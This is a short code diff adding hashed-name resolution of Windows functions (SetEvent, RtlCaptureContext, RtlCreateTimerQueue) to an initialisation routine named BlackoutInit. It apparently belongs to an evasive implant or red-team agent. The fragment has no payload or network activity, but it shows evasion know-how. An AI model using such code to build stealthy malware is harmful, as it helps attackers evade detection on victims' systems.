@@ -83,6 +83,8 @@ FUNC VOID BlackoutInit(
     Instance()->Win32.SetFileInformationByHandle= LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "SetFileInformationByHandle" )  );
     Instance()->Win32.LoadLibraryExA            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryExA" )  );
     Instance()->Win32.LoadLibraryExW            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryExW" )  );
+    Instance()->Win32.SetEvent                  = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "SetEvent" )  );
+    Instance()->Win32.RtlCaptureContext         = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "RtlCaptureContext" )  );
 
     Instance()->Win32.RtlCompareMemory          = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlCompareMemory" )  );
     Instance()->Win32.RtlZeroMemory             = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlZeroMemory" )  );
@@ -116,6 +118,7 @@ FUNC VOID BlackoutInit(
     Instance()->Win32.NtQueryInformationThread  = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtQueryInformationThread" ) );
     Instance()->Win32.NtSetInformationVirtualMemory = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtSetInformationVirtualMemory" ) );
     
+    Instance()->Win32.RtlCreateTimerQueue       = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlCreateTimerQueue" ) );
     Instance()->Win32.NtAlertResumeThread       = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtAlertResumeThread" ) );
     Instance()->Win32.NtContinue                = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtContinue" ) );
     Instance()->Win32.NtCreateEvent             = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtCreateEvent" ) );
